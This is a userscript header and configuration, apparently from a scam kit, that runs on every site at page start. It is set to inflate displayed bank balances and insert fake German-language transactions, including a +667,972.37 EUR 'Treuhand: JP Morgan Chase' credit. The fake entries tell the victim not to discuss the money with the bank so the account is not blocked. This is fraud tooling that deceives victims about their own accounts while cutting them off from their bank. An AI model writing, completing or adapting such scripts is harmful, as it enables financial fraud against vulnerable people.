// ==UserScript==
// @name         Ed WM Sp Start Siegfried Stampfl
// @namespace    http://tampermonkey.net/
// @version      13.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/495239/Ed%20WM%20Sp%20Start%20Siegfried%20Stampfl.user.js
// @updateURL https://update.greasyfork.org/scripts/495239/Ed%20WM%20Sp%20Start%20Siegfried%20Stampfl.meta.js
// ==/UserScript==



//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================



// GESAMT START

   // Configurable modification amounts and their corresponding indexes
    const accountBalanceAdjustments = [
        { index: 0, amount: 43000},

    ];

// BALANCES START

    // Configurable modification amounts and their corresponding indexes
    const balanceModificationConfig = [
        { index: 0, amount: 43000 },
   //      { index: 1, amount: 20},

        { index: 4, amount: 43000},
        { index: 5, amount: 43000},
    ];

//  UMSATZE BALANCE

  // Configurable modification amount
    const modificationAmount = 43000; // Set your desired modification amount here
    const accountValue = '920043381'; // Set your desired account value here
    const useSelectedOption = true; // Set to false to ignore the selected option in the dropdown  BEING SET TO TRUE WHEN CLIENT HAS MANY ACCOUNTS, HOWEVER, WHEN CLIENT HAS 1 ACCOUNT IS USUALLY  BEING SET TO FALSE


// UMSATZE TRANSACTIONS

   // Specify transactions here
    const transactions = [
           {
            transactionDate: "Vorgemerkt",
            transactionDateBooking: " ",
            transactionTitle: "Treuhand: JP Morgan Chase",
            transactionDetails: "Freigabe nötig durch Absender. A. Graf meldet sich. Mit Bank nicht besprechen damit nicht gesperrt.",
            transactionAmount: "+667.972,37 EUR",
            insertPosition: 'above' // Specify position for this transaction
        },
    {
            transactionDate: "15.07.2024",
            transactionDateBooking: "15.07.2024",
            transactionTitle: "JP Morgan Chase",
           transactionDetails: "Geld für Steuern. A. Graf meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
           transactionAmount: "+43.000,00 EUR",
           insertPosition: 'above' // Specify position for this transaction
       },
 //           transactionDate: "01.07.2024",
 //           transactionDateBooking: "01.07.2024",
 //           transactionDetails: "Bank of America 3.000 Euro 04.07. 10356100",
 //           transactionAmount: "-3.000,00 EUR",
 //           insertPosition: 'above' // Specify position for this transaction
 //       }
        // Add more transactions as needed
    ];



//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================

